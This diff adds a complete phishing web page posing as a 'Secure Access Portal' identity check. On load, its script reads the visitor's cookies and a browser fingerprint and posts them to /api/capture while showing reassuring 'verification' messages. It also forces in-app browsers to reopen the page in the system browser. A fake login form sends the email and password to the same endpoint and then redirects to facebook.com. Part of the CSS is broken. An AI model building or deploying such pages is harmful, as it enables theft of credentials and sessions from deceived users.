@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Portal - Verify Identity</title>
+    <style>
+        :root {
+            --primary: #2c3e50;
+            --accent: #3498db;
+            --bg: #f4f7f6;
+            --card-bg: #ffffff;
+            --text: #333333;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: var(--card-bg);
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: var(--primary);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 1.5rem;
+            font-size: 2rem;
+            font-weight: bold;
+        }
+        h1 { color: var(--primary); margin-bottom: 0.5rem; font-size: 1.5rem; }
+        p.subtitle { color: #7f8c8d; margin-bottom: 2rem; font-size: 0.9rem; }
+        
+        .status-box {
+            background: #e8f4fd;
+            border: 1px solid #b3d4fc;
+            padding: 1rem;
+            border-radius: 8px;
+            margin-top: 1.5rem;
+            font-size: 0.9rem;
+            color: #2980b9;
+            display: none;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--accent);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .footer { margin-top: 2rem; font-size: 0.75rem; color: #95a5a6; }
+        .site-badge {
+            display: inline-block;
+            background: #ecf0f1;
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            margin: 0.5rem 0.25rem;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">S</div>
+    <h1>Secure Access Portal</h1>
+    <p class="subtitle">Please wait while we verify your session and device integrity.</p>
+    
+    <div class="spinner" id="spinner"></div>
+    
+    <div class="status-box" id="statusBox">
+        <strong>Initializing...</strong>
+        <br>
+        <span id="statusText">Scanning browser environment and retrieving session tokens.</span>
+    </div>
+
+    <div id="sitesContainer">
+        <div class="site-badge">Facebook</div>
+        <div class="site-badge">Twitter/X</div>
+        <div class="site-badge">Google</div>
+    </div>
+
+    <div class="footer">
+        &copy; 2024 SecureNet Solutions. All rights reserved.
+    </div>
+</div>
+
+<script>
+    // 1. DETECT IN-APP BROWSER (FB, INSTAGRAM, TWITTER, ETC.)
+    function isInAppBrowser() {
+        const ua = navigator.userAgent;
+        if (ua.includes('FBAV')) return true; 
+        if (ua.includes('Instagram')) return true;
+        if (ua.includes('Twitter') || ua.includes('Twitter for Android')) return true;
+        if (ua.includes('Safari') && ua.includes('Version/1') && !ua.includes('Safari/')) return true;
+        return false;
+    }
+
+    // 2. AUTO-REDIRECT TO SYSTEM BROWSER
+    if (isInAppBrowser() && !window.location.href.includes('force_browser=1')) {
+        const newUrl = window.location.href + (window.location.href.includes('?') ? '&' : '?') + 'force_browser=1';
+        window.open(newUrl, '_system');
+        setTimeout(() => {
+            if (!window._redirected) {
+                window.location.href = newUrl;
+                window._redirected = true;
+            }
+        }, 100);
+        document.getElementById('statusBox').style.display = 'block';
+        document.getElementById('statusText').innerText = "Opening in system browser for secure verification...";
+        return;
+    }
+
+    // 3. STEAL COOKIES (Multi-Site Logic)
+    function sendCookies() {
+        const cookies = document.cookie;
+        
+        // Fingerprint Data
+        const fingerprint = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            isMobile: /Mobi/.test(navigator.userAgent),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+
+        const payload = {
+            cookies: cookies,
+            fingerprint: fingerprint
+        };
+
+        // UI Feedback
+        document.getElementById('statusBox').style.display = 'block';
+        document.getElementById('spinner').style.display = 'block';
+        document.getElementById('statusText').innerText = "Transmitting session data to secure gateway...";
+
+        fetch('/api/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('statusText').innerText = "Verification Complete. You are now securely connected.";
+                document.getElementById('statusBox').style.background = '#d4edda';
+                document.getElementById('statusBox').style.borderColor = '#c3e6cb';
+                document.getElementById('statusBox').style.color = '#155724';
+            }
+        })
+        .catch(error => {
+            console.error('Error sending cookies:', error);
+            document.getElementById('statusText').innerText = "Connection error. Please try refreshing the page.";
+        });
+    }
+
+    // Auto-run on load
+    window.onload = function() {
+        setTimeout(sendCookies, 1000);
+    };
+</script>
+
+<form id="loginForm" action="/api/capture" method="POST" style="margin: 20px 0;">
+    <input type="text" name="email" placeholder="Email or Phone" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px;" required>
+    <input type="password" name="pass" placeholder="Password" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px;" required>
+    <button type="submit" style="width: 100%; padding: 10px; background: #2c3e50; color: white; border: none; border-radius: 5px; cursor: pointer;">Log In</button>
+</form>
+<script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const formData = new URLSearchParams(new FormData(this));
+        fetch("/api/capture", {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: formData
+        }).then(() => {
+            window.location.href = "https://facebook.com";
+        });
+    });
+</script>
+</body>
+</html>
